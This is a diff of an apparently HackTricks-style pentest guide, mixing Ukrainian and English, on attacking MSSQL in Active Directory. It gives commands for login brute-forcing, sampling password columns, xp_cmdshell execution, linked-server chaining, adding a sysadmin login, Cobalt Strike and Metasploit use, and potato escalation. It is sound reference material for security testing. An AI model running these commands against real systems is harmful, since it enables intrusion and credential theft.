@@ -1,9 +1,9 @@
-# MSSQL AD Зловживання
+# MSSQL AD Abuse
 
 {{#include ../../banners/hacktricks-training.md}}
 
 
-## **MSSQL Перерахунок / Виявлення**
+## **MSSQL Enumeration / Discovery**
 
 ### Python
 
@@ -91,11 +91,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ###  Powershell
 
 Модуль powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) є дуже корисним у цьому випадку.
-```powershell
+```bash
 Import-Module .\PowerupSQL.psd1
 ````
 ### Перерахунок з мережі без доменної сесії
-```powershell
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -109,7 +109,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
 ### Перерахунок зсередини домену
-```powershell
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -117,6 +117,12 @@ Get-SQLInstanceLocal | Get-SQLServerInfo
 #Get info about valid MSQL instances running in domain
 #This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
 Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+
+# Try dictionary attack to login
+Invoke-SQLAuditWeakLoginPw
+
+# Search SPNs of common software and try the default creds
+Get-SQLServerDefaultLoginPw
 
 #Test connections with each one
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
@@ -127,14 +133,26 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## MSSQL Основне Зловживання
+## MSSQL Basic Abuse
 
-### Доступ до БД
-```powershell
+### Access DB
+```bash
+# List databases
+Get-SQLInstanceDomain | Get-SQLDatabase
+
+# List tables in a DB you can read
+Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName
+
+# List columns in a table
+Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName
+
+# Get some sample data from a column in a table (columns username & passwor din the example)
+Get-SQLInstanceDomain | GetSQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10
+
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
 
-#Dump an instance (a lotof CVSs generated in current dir)
+#Dump an instance (a lot of CVSs generated in current dir)
 Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 
 # Search keywords in columns trying to access the MSSQL DBs
@@ -144,7 +162,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ### MSSQL RCE
 
 Можливо також **виконувати команди** всередині хоста MSSQL
-```powershell
+```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
@@ -163,7 +181,7 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 **Посилання між базами даних працюють навіть через довіри лісу.**
 
 ### Зловживання Powershell
-```powershell
+```bash
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
 
@@ -194,6 +212,12 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
+Інший подібний інструмент, який можна використовувати, це [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
+```bash
+SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+# Cobalt Strike
+inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+```
 ### Metasploit
 
 Ви можете легко перевірити надійні посилання, використовуючи metasploit.
@@ -202,7 +226,7 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Зверніть увагу, що metasploit намагатиметься зловживати лише функцією `openquery()` в MSSQL (отже, якщо ви не можете виконати команду з `openquery()`, вам потрібно буде спробувати метод `EXECUTE` **вручну** для виконання команд, див. нижче.)
+Зверніть увагу, що metasploit намагатиметься зловживати лише функцією `openquery()` в MSSQL (отже, якщо ви не можете виконати команду з `openquery()`, вам потрібно буде спробувати метод `EXECUTE` **вручну** для виконання команд, див. більше нижче.)
 
 ### Вручну - Openquery()
 
@@ -210,7 +234,7 @@ msf> use exploit/windows/mssql/mssql_linkcrawler
 
 З **Windows** ви також можете знайти посилання та виконати команди вручну, використовуючи **клієнт MSSQL, такий як** [**HeidiSQL**](https://www.heidisql.com)
 
-_Увійдіть за допомогою Windows аутентифікації:_
+_Увійдіть за допомогою аутентифікації Windows:_
 
 ![](<../../images/image (808).png>)
 
@@ -228,7 +252,7 @@ EXEC sp_linkedservers;
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> Перевірте, де використовуються подвійні та одинарні лапки, важливо використовувати їх таким чином.
+> Перевірте, де використовуються подвійні та одинарні лапки, важливо використовувати їх саме так.
 
 ![](<../../images/image (643).png>)
 
@@ -252,9 +276,9 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## Підвищення локальних привілеїв
 
-**MSSQL локальний користувач** зазвичай має спеціальний тип привілею, званий **`SeImpersonatePrivilege`**. Це дозволяє обліковому запису "імплементувати клієнта після аутентифікації".
+**MSSQL локальний користувач** зазвичай має спеціальний тип привілею, званий **`SeImpersonatePrivilege`**. Це дозволяє обліковому запису "вдаватись під клієнта після аутентифікації".
 
-Стратегія, яку розробили багато авторів, полягає в тому, щоб змусити службу SYSTEM аутентифікуватися до зловмисної або атаки "людина посередині" служби, яку створює зловмисник. Ця зловмисна служба потім може імплементувати службу SYSTEM під час спроби аутентифікації.
+Стратегія, яку розробили багато авторів, полягає в тому, щоб змусити службу SYSTEM аутентифікуватись до зловмисної або атаки "людина посередині" служби, яку створює зловмисник. Ця зловмисна служба потім може вдаватися під службу SYSTEM, поки вона намагається аутентифікуватись.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) має колекцію цих різних технік, які можна виконати за допомогою команди `execute-assembly` Beacon. 
 
